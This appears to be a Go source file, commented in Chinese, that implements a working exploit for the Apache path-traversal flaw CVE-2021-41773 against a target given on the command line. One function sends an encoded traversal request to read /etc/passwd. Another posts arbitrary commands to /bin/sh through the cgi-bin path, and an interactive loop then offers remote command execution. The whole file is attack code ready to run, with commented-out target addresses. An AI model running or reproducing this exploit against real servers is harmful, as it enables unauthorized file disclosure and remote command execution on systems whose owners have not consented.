package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

// apahe 路径穿越漏洞--cve-2021-41773

func banner() {
	fmt.Println(`
	###   #   #  #####          ###    ###    ###     #             ##     #    #####  #####   ###  
	#   #  #   #  #             #   #  #   #  #   #   ##             ##    ##    #   #  #   #  #   # 
	#      #   #  #                 #  #  ##      #    #            # #     #        #      #      # 
	#       # #   ####   #####     #   # # #     #     #    #####   # #     #       #      #     ##  
	#       # #   #               #    ##  #    #      #           #####    #       #      #       # 
	#   #    #    #              #     #   #   #       #              #     #      #      #    #   # 
	 ###     #    #####         #####   ###   #####    #             ###    #      #      #     ###  
	`)
}

func argsCheck(args []string) {
	if len(args) != 2 {
		fmt.Printf("Usage:\n\t./%s \n", args[0])
		os.Exit(0)
	}
}

func urlHandler(target string) string {
	// 没有http前缀的添加http前缀
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	// 结尾有 / 的就去掉
	if strings.HasSuffix(target, "/") {
		// 去掉后缀 /
		target = strings.TrimSuffix(target, "/")
		fmt.Println(target)
	}
	return target
}

// 检测是否为200
func StatusCode(target string) bool {
	resp, err := http.Get(target)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		return true
	}
	return false
}

// 文件读取
func poc(target string) bool {
	vulurl := target + "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
	// fmt.Println(vulurl)
	// url := "http://123.58.224.8:40666/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
	req, _ := http.NewRequest("GET", vulurl, nil)
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("target： %s 访问错误\n", target)
	}
	defer res.Body.Close()
	body, _ := ioutil.ReadAll(res.Body)

	// fmt.Println(string(body))
	file := string(body)
	if StatusCode(target) {
		// fmt.Printf("target： %s 存在漏洞\n", target)
		fmt.Println(file)
		return true
	}

	// fmt.Println(file)
	return false
}

// 执行命令
func exp(target string, command string) {
	// 创建请求
	vulurl := target + "/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"
	// data := `echo; ls /tmp`
	data := `echo; `+ command
	req, _ := http.NewRequest("POST", vulurl, bytes.NewReader([]byte(data)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")

	// 发起请求：
	client := http.Client{}
	resp, _ := client.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)

	// strings.Replace()--"func Replace(s, old, new string, n int) 下面
	// string返回将s中前n个不重叠old子串都替换为new的新字符串，如果n<0会替换所有old子串。"
	res := strings.Replace(string(body), "执行错误", "", -1)
	res = strings.TrimSpace(res)
	fmt.Println(res)
	// fmt.Println(string(body))
}
func main() {
	args := os.Args
	banner()
	argsCheck(args)
	target := args[1]
	// target := "123.58.224.8:23718"
	target = urlHandler(target)

	if poc(target) {
		fmt.Printf("target： %s 存在漏洞\n", target)
		var command string
		for {
			for {
				fmt.Printf("\n\ncommand:")
				fmt.Scanln(&command)
				if command != "" {
					break
				}
			}
			exp(target, command)
		}
	} else {
		fmt.Printf("target： %s 不存在漏洞\n", target)
	}
}
